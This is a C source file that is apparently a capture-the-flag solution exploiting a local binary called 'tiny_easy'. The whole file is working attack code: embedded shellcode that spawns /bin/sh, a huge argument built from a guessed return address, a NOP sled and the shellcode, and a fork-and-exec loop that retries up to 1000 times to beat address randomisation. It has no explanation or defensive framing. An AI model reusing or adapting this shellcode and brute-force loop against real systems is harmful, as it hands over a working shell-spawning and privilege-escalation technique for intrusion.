#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>

char *shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";

int main()
{
    char arg[130001] = {0};  // Ensure it's null-terminated
    int status;
    int max_attempts = 1000; // Limit retries to prevent system crash

    // Inject the target return address
    memcpy(arg, "\x3D\xD3\xFF\xFF", 4);

    // Fill the buffer with NOPs
    memset(arg + 4, '\x90', 130001 - 4 - strlen(shellcode) - 1);

    // Place shellcode at the end
    memcpy(arg + 130000 - strlen(shellcode), shellcode, strlen(shellcode));

    // Ensure NULL termination
    arg[130000] = '\0';

    // Set up argv properly
    char *argv[] = {arg, NULL};

    for (int i = 0; i < max_attempts; i++) {
        if (0 == fork()) {
            execve("./tiny_easy", argv, NULL);
        }
        wait(&status);
        if (WIFEXITED(status)) {
            break;
        }
    }

    return 0;
}
